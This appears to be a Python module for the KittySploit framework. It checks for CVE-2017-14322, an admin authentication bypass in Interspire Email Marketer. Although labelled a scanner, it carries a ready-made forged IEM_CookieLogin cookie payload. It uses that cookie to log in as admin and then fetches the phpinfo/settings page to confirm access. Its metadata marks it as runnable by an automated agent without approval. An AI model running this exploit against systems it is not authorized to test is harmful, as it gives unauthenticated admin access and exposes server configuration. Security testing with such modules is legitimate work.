#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Interspire Email Marketer admin auth bypass (CVE-2017-14322)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Interspire IEM - Admin Auth Bypass Detection (CVE-2017-14322)',
        'description': (
            'Detects CVE-2017-14322 by sending crafted IEM_CookieLogin and verifying access '
            'to admin settings/phpinfo.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2017', 'interspire', 'iem', 'auth-bypass', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-14322',
        ],
        'cve': 'CVE-2017-14322',
    }

    COOKIE = (
        'IEM_CookieLogin=YTo0OntzOjQ6InVzZXIiO3M6MToiMSI7czo0OiJ0aW1lIjtpOjE3MTA0NzcyOTQ7'
        'czo0OiJyYW5kIjtiOjE7czo4OiJ0YWtlbWV0byI7czo5OiJpbmRleC5waHAiO30='
    )

    def run(self):
        for base in ('', '/emailmarketer', '/iem', '/interspire'):
            login = f'{base}/admin/index.php?Page=&Action=Login'
            data = 'ss_username=admin&ss_password=admin&ss_takemeto=index.php&SubmitButton=Login'
            r = self.http_request(
                method='POST',
                path=login,
                data=data,
                headers={
                    'Cookie': self.COOKIE,
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                allow_redirects=False,
            )
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if not (
                ('admin/index.php?Page=Addons&Addon=dbcheck"' in body
                 or 'admin/index.php?Page=Addons&Addon=checkpermissions' in body)
                and ('<div class="loggedinas">' in body or 'Page=Logout"' in body)
            ):
                continue
            info = f'{base}/admin/index.php?Page=Settings&Action=showinfo'
            g = self.http_request(
                method='GET', path=info, headers={'Cookie': self.COOKIE}, allow_redirects=False,
            )
            if not g or g.status_code != 200:
                continue
            text = g.text or ''
            if (
                ('System' in text and 'Build Date' in text)
                or '<title>phpinfo()</title>' in text
                or '<h1>Configuration</h1>' in text
                or ('SERVER_ADMIN' in text and 'SERVER_ADDR' in text)
            ):
                self.set_info(
                    severity='critical',
                    reason='Interspire IEM admin auth bypass (CVE-2017-14322)',
                    path=info,
                )
                return True
        return False
